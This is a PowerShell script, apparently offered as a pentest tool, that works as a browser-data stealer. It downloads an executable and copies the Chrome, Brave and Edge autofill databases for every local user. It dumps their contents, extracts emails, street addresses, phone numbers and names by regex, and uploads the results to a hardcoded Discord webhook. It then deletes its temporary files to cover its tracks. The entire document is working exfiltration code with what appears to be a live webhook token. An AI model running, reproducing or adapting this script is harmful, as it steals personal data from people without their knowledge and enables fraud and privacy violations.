$DOWNLOAD_URL = "https://github.com/pentestfunctions/browserdata_to_discord/raw/main/portable_sql_browser.exe"
$FILENAME = "run.exe"
$CURRENT_DIR = Split-Path -Parent -Path $MyInvocation.MyCommand.Definition
# Define the webhook URL
$WEBHOOK_URL = "https://discord.com/api/webhooks/1175456333999386624/IOc4YUUmkVA7Rfp6zCyxvBN1f1Jv6wQpfCMRE2KYSUB5oRLt9fN5PQUbT2N4g8eoRtlX"

if (!(Test-Path $FILENAME)) {
    Invoke-WebRequest -Uri $DOWNLOAD_URL -OutFile $FILENAME
}

$browser_info = @{
    "Chrome" = "Google\Chrome\User Data\Default\Web Data"
    "Brave" = "BraveSoftware\Brave-Browser\User Data\Default\Web Data"
    "Edge" = "Microsoft\Edge\User Data\Default\Web Data"
}

Get-ChildItem "$env:systemdrive\Users\" -Directory | ForEach-Object {
    $user_path = Join-Path -Path "$env:systemdrive\Users\$_" -ChildPath "AppData\Local"

    foreach($browser in $browser_info.GetEnumerator()){
        $web_data_path = Join-Path -Path $user_path -ChildPath $browser.Value

        if (Test-Path $web_data_path) {
            $timestamp = Get-Date -Format "yyyyMMdd-HHmm"
            $new_name = "$($_.Name)_$($browser.Name)_Web_Data_$timestamp"
            $new_path = Join-Path -Path $CURRENT_DIR -ChildPath $new_name
            Copy-Item -Path $web_data_path -Destination $new_path
        }
    }
}

Get-ChildItem -Path "$CURRENT_DIR\*Web_Data*" | ForEach-Object {
    if ($_.Length -eq 0) {
        Remove-Item -Path $_.FullName
    }
    else {
        $DB_FILE = $_.FullName
        & "$CURRENT_DIR\$FILENAME" $DB_FILE ".tables" | ForEach-Object {
            & "$CURRENT_DIR\$FILENAME" $DB_FILE "SELECT * FROM $_;" | Out-File -FilePath "$CURRENT_DIR\output.txt" -Append
        }
    }
}

Remove-Item -Path "$CURRENT_DIR\*Web_Data*"
Remove-Item -Path "$CURRENT_DIR\$FILENAME"

# Incorporate the rest of your PowerShell code here...

# Read the contents of the output.txt file 
$content = Get-Content -Path "$CURRENT_DIR\output.txt" -Raw 

# Define regex patterns for email addresses, street addresses, phone numbers, and names 
$email_pattern = '\b[A-Za-z0-9._+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b' 
$address_pattern = '\d+\s+([A-Za-z]+\s+){1,3}(Street|South|North|East|West|Road|Avenue|Boulevard|Ln\.|Lane|Dr\.|Drive|Cir\.|Circle|Ct\.|Court|Terr\.|Terrace|Pl\.|Place|Pkwy\.|Parkway|Way|St\.|Rd\.|Ave\.)'
$phone_pattern = '\b(?:0|2)?\d{7,10}\b'
$first_name_pattern = '(?<=firstName\|)[A-Za-z]+' # Updated first name pattern
$last_name_pattern = '(?<=lastName\|)[A-Za-z]+' # Updated last name pattern

# Find matches for each pattern and output the results 
$email_matches = Select-String -InputObject $content -Pattern $email_pattern -AllMatches | ForEach-Object {$_.Matches.Value.ToLower()} | Group-Object | Sort-Object -Descending -Property Count | Select-Object -First 10
$address_matches = Select-String -InputObject $content -Pattern $address_pattern -AllMatches | ForEach-Object {$_.Matches.Value.ToLower()} | Select-Object -Unique
$phone_matches = Select-String -InputObject $content -Pattern $phone_pattern -AllMatches | ForEach-Object {$_.Matches.Value} | Group-Object | Sort-Object -Descending -Property Count

# Find the top 5 most likely first and last names
$first_name_matches = Select-String -InputObject $content -Pattern $first_name_pattern -AllMatches | ForEach-Object {$_.Matches.Value.ToLower()} | Group-Object | Sort-Object -Descending -Property Count | Select-Object -First 5
$last_name_matches = Select-String -InputObject $content -Pattern $last_name_pattern -AllMatches | ForEach-Object {$_.Matches.Value.ToLower()} | Group-Object | Sort-Object -Descending -Property Count | Select-Object -First 5

# Define output file
$OUTPUT_FILE = "disc.txt"

# Print out the matches
"Email matches:" | Out-File $OUTPUT_FILE
$email_matches | Foreach-Object {"$($_.Name)"} | Out-File $OUTPUT_FILE -Append

"`nAddress matches:" | Out-File $OUTPUT_FILE -Append
$address_matches | Out-File $OUTPUT_FILE -Append

# Find the most likely phone number and the remaining phone matches
$most_likely_phone = $phone_matches | Select-Object -First 1

"`nMost likely phone number:" | Out-File $OUTPUT_FILE -Append
$most_likely_phone.Name | Out-File $OUTPUT_FILE -Append

# Print the top 5 most likely first names
"`nTop 5 most likely first names:" | Out-File $OUTPUT_FILE -Append
$first_name_matches | Foreach-Object {"$($_.Name)"} | Out-File $OUTPUT_FILE -Append

"`nTop 5 most likely last names:" | Out-File $OUTPUT_FILE -Append
$last_name_matches | Foreach-Object {"$($_.Name)"} | Out-File $OUTPUT_FILE -Append

# Read the file content
$fileContent = Get-Content $OUTPUT_FILE -Raw

# Prepare the body content as multipart/form-data
$boundary = [guid]::NewGuid().ToString() 
$LF = "`r`n"
$bodyLines = @(
    "--$boundary"
    "Content-Disposition: form-data; name=`"file`"; filename=`"$OUTPUT_FILE`""
    "Content-Type: text/plain$LF"
    $fileContent
    "--$boundary--$LF"
) -join $LF

$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)

# Send the POST request with the file content
Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes

# Clean up output.txt and disc.txt files
Remove-Item -Path "$CURRENT_DIR\output.txt"
Remove-Item -Path "$OUTPUT_FILE"
